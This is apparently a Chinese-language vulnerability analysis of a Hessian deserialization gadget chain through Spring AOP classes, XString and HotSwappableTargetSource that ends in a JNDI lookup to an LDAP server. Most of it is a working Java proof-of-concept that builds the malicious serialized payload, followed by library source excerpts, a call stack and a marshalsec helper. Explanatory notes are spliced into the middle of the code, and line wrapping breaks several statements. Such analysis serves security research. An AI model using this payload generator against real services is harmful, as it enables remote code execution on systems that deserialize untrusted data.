import org.springframework.aop.target.HotSwappableTargetSource;
import org.springframework.jndi.support.SimpleJndiBeanFactory;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
public class SpringPartiallyComparableAdvisorHoldertest {
    public static void main(String[] args) throws Exception {
        String jndiUrl = "ldap://localhost:1389/obj";
        SimpleJndiBeanFactory bf = new SimpleJndiBeanFactory();
        bf.setShareableResources(jndiUrl);
//反序列化时BeanFactoryAspectInstanceFactory.getOrder会被调用，会触发调用
SimpleJndiBeanFactory.getType->SimpleJndiBeanFactory.doGetType-
>SimpleJndiBeanFactory.doGetSingleton->SimpleJndiBeanFactory.lookup-
>JndiTemplate.lookup
        Reflections.setFieldValue(bf, "logger", new NoOpLog());
        Reflections.setFieldValue(bf.getJndiTemplate(), "logger", new 
NoOpLog());
//反序列化时AspectJAroundAdvice.getOrder会被调用，会触发
BeanFactoryAspectInstanceFactory.getOrder
        AspectInstanceFactory aif = 
Reflections.createWithoutConstructor(BeanFactoryAspectInstanceFactory.class);
        Reflections.setFieldValue(aif, "beanFactory", bf);
        Reflections.setFieldValue(aif, "name", jndiUrl);
//反序列化时AspectJPointcutAdvisor.getOrder会被调用，会触发
AspectJAroundAdvice.getOrder
        AbstractAspectJAdvice advice = 
Reflections.createWithoutConstructor(AspectJAroundAdvice.class);
        Reflections.setFieldValue(advice, "aspectInstanceFactory", aif);
//反序列化时PartiallyComparableAdvisorHolder.toString会被调用，会触发
AspectJPointcutAdvisor.getOrder
        AspectJPointcutAdvisor advisor = 
Reflections.createWithoutConstructor(AspectJPointcutAdvisor.class);
        Reflections.setFieldValue(advisor, "advice", advice);
//反序列化时Xstring.equals会被调用，会触发PartiallyComparableAdvisorHolder.toString
        Class pcahCl = 
Class.forName("org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAuto
ProxyCreator$PartiallyComparableAdvisorHolder");
        Object pcah = Reflections.createWithoutConstructor(pcahCl);
        Reflections.setFieldValue(pcah, "advisor", advisor);
//反序列化时HotSwappableTargetSource.equals会被调用，触发Xstring.equals
        HotSwappableTargetSource v1 = new HotSwappableTargetSource(pcah);
        HotSwappableTargetSource v2 = new HotSwappableTargetSource(new 
XString("xxx"));
        HashMap s = new HashMap<>();
        Reflections.setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, 
Object.class, Object.class, nodeC);
以上代码 在序列化部分多出来了几行代码。我们知道，一般对于对象的序列化，如果对象对应的class没
有对 java.io.Serializable 进行实现implement的话，是没办法序列化的，所以这里对输出流进行了
设置，使其可以输出没有实现java.io.Serializable接口的对象。
将断点打到 com.caucho.hessian.io.MapDeserializer#readMap
调用HashMap的put方法
        nodeCons.setAccessible(true);
        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, "table", tbl);
//反序列化时HashMap.putVal会被调用，触发HotSwappableTargetSource.equals。这里没有直接使
用HashMap.put设置值，直接put会在本地触发利用链，所以使用marshalsec使用了比较特殊的处理方式。
        ByteArrayOutputStream byteArrayOutputStream = new 
ByteArrayOutputStream();
        Hessian2Output hessian2Output = new 
Hessian2Output(byteArrayOutputStream);
        HessianBase.NoWriteReplaceSerializerFactory sf = new 
HessianBase.NoWriteReplaceSerializerFactory();
        sf.setAllowNonSerializable(true);
        hessian2Output.setSerializerFactory(sf);
        hessian2Output.writeObject(s);
        hessian2Output.flushBuffer();
        byte[] bytes = byteArrayOutputStream.toByteArray();
        // hessian2反序列化
        ByteArrayInputStream byteArrayInputStream = new 
ByteArrayInputStream(bytes);
        Hessian2Input hessian2Input = new Hessian2Input(byteArrayInputStream);
        HashMap o = (HashMap) hessian2Input.readObject();
    }
}
public Object readMap(AbstractHessianInput in) throws IOException {
   ...
    while(!in.isEnd()) {
        ((Map)map).put(in.readObject(), in.readObject());
    }
    in.readEnd();
    return map;
}
public V put(K key, V value) {
        return putVal(hash(key), key, value, false, true);
    }
与前面不同的是这里是借助putVal方法
key.equals方法位置进行跟踪
调用obj2的toString
 final V putVal(int hash, K key, V value, boolean onlyIfAbsent,
                   boolean evict) {
        Node[] tab; Node p; int n, i;
        if ((tab = table) == null || (n = tab.length) == 0)
            n = (tab = resize()).length;
        if ((p = tab[i = (n - 1) & hash]) == null)
            tab[i] = newNode(hash, key, value, null);
        else {
            Node e; K k;
            if (p.hash == hash &&
                ((k = p.key) == key || (key != null && key.equals(k))))
public boolean equals(Object other) {
    return this == other || other instanceof HotSwappableTargetSource && 
this.target.equals(((HotSwappableTargetSource)other).target);
}
public boolean equals(Object obj2)
{
  if (null == obj2)
    return false;
    // In order to handle the 'all' semantics of
    // nodeset comparisons, we always call the
    // nodeset function.
  else if (obj2 instanceof XNodeSet)
    return obj2.equals(this);
  else if(obj2 instanceof XNumber)
      return obj2.equals(this);
  else
    return str().equals(obj2.toString());
}
  public boolean equals(Object obj2)
  {
    if (null == obj2)
      return false;
      // In order to handle the 'all' semantics of
      // nodeset comparisons, we always call the
      // nodeset function.
    else if (obj2 instanceof XNodeSet)
      return obj2.equals(this);
    else if(obj2 instanceof XNumber)
        return obj2.equals(this);
    else
      return str().equals(obj2.toString());
  }
  public String toString() {
            StringBuilder sb = new StringBuilder();
            Advice advice = this.advisor.getAdvice();
            sb.append(ClassUtils.getShortName(advice.getClass()));
            sb.append(": ");
            if (this.advisor instanceof Ordered) {
                sb.append("order 
").append(((Ordered)this.advisor).getOrder()).append(", ");
            }
public int getOrder() {
    return this.order != null ? this.order : this.advice.getOrder();
}
public int getOrder() {
    return this.aspectInstanceFactory.getOrder();
}
public int getOrder() {
    Class type = this.beanFactory.getType(this.name);
    if (type != null) {
        return Ordered.class.isAssignableFrom(type) && 
this.beanFactory.isSingleton(this.name) ? 
((Ordered)this.beanFactory.getBean(this.name)).getOrder() : 
OrderUtils.getOrder(type, 2147483647);
    } else {
        return 2147483647;
    }
}
到了该位置调用 this.lookup(name, requiredType);
public Class getType(String name) throws NoSuchBeanDefinitionException {
    try {
        return this.doGetType(name);
    } catch (NameNotFoundException var3) {
        throw new NoSuchBeanDefinitionException(name, "not found in JNDI 
environment");
    } catch (NamingException var4) {
        return null;
    }
}
 private Class doGetType(String name) throws NamingException {
        if (this.isSingleton(name)) {
            Object jndiObject = this.doGetSingleton(name, (Class)null);
            return jndiObject != null ? jndiObject.getClass() : null;
 private  T doGetSingleton(String name, Class requiredType) throws 
NamingException {
        synchronized(this.singletonObjects) {
            Object jndiObject;
            if (this.singletonObjects.containsKey(name)) {
                jndiObject = this.singletonObjects.get(name);
                if (requiredType != null && 
!requiredType.isInstance(jndiObject)) {
                    throw new 
TypeMismatchNamingException(this.convertJndiName(name), requiredType, jndiObject 
!= null ? jndiObject.getClass() : null);
                } else {
                    return jndiObject;
                }
            } else {
                jndiObject = this.lookup(name, requiredType);
                this.singletonObjects.put(name, jndiObject);
                return jndiObject;
            }
        }
    }
  protected  T lookup(String jndiName, Class requiredType) throws 
NamingException {
        Assert.notNull(jndiName, "'jndiName' must not be null");
        String convertedName = this.convertJndiName(jndiName);
        Object jndiObject;
        try {
            jndiObject = this.getJndiTemplate().lookup(convertedName, 
requiredType);
该位置获取InitialContext对象，传递到 var3 = contextCallback.doInContext(ctx); 方法进行继续
调用
至此触发漏洞，该链比较长
public  T lookup(String name, Class requiredType) throws NamingException {
    Object jndiObject = this.lookup(name);
    if (requiredType != null && !requiredType.isInstance(jndiObject)) {
        throw new TypeMismatchNamingException(name, requiredType, jndiObject != 
null ? jndiObject.getClass() : null);
public Object lookup(final String name) throws NamingException {
        if (this.logger.isDebugEnabled()) {
            this.logger.debug("Looking up JNDI object with name [" + name + 
"]");
        }
        return this.execute(new JndiCallback() {
 public  T execute(JndiCallback contextCallback) throws NamingException {
        Context ctx = this.getContext();
        Object var3;
        try {
            var3 = contextCallback.doInContext(ctx);
        } finally {
            this.releaseContext(ctx);
        }
        return var3;
    }
 public Object doInContext(Context ctx) throws NamingException {
                Object located = ctx.lookup(name);
                if (located == null) {
                    throw new NameNotFoundException("JNDI object with [" + name 
+ "] not found: JNDI implementation returned null");
                } else {
                    return located;
                }
调用栈
SpringAbstractBeanFactoryPointcutAdvisor
构造分析
lookup:417, InitialContext (javax.naming)
doInContext:155, JndiTemplate$1 (org.springframework.jndi)
execute:87, JndiTemplate (org.springframework.jndi)
lookup:152, JndiTemplate (org.springframework.jndi)
lookup:179, JndiTemplate (org.springframework.jndi)
lookup:95, JndiLocatorSupport (org.springframework.jndi)
doGetSingleton:218, SimpleJndiBeanFactory (org.springframework.jndi.support)
doGetType:226, SimpleJndiBeanFactory (org.springframework.jndi.support)
getType:191, SimpleJndiBeanFactory (org.springframework.jndi.support)
getOrder:127, BeanFactoryAspectInstanceFactory 
(org.springframework.aop.aspectj.annotation)
getOrder:216, AbstractAspectJAdvice (org.springframework.aop.aspectj)
getOrder:80, AspectJPointcutAdvisor (org.springframework.aop.aspectj)
toString:151, 
AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder 
(org.springframework.aop.aspectj.autoproxy)
equals:392, XString (com.sun.org.apache.xpath.internal.objects)
equals:104, HotSwappableTargetSource (org.springframework.aop.target)
putVal:635, HashMap (java.util)
put:612, HashMap (java.util)
readMap:114, MapDeserializer (com.caucho.hessian.io)
readMap:538, SerializerFactory (com.caucho.hessian.io)
readObject:2110, Hessian2Input (com.caucho.hessian.io)
main:87, SpringPartiallyComparableAdvisorHoldertest
default Object makeBeanFactoryPointcutAdvisor ( UtilFactory uf, String[] args ) 
throws Exception {
    String jndiUrl = args[ 0 ];
    return SpringUtil.makeBeanFactoryTriggerBFPA(uf, jndiUrl, 
SpringUtil.makeJNDITrigger(jndiUrl));
}
public static BeanFactory makeJNDITrigger ( String jndiUrl ) throws Exception {
    SimpleJndiBeanFactory bf = new SimpleJndiBeanFactory();
    bf.setShareableResources(jndiUrl);
    Reflections.setFieldValue(bf, "logger", new NoOpLog());
    Reflections.setFieldValue(bf.getJndiTemplate(), "logger", new NoOpLog());
    return bf;
}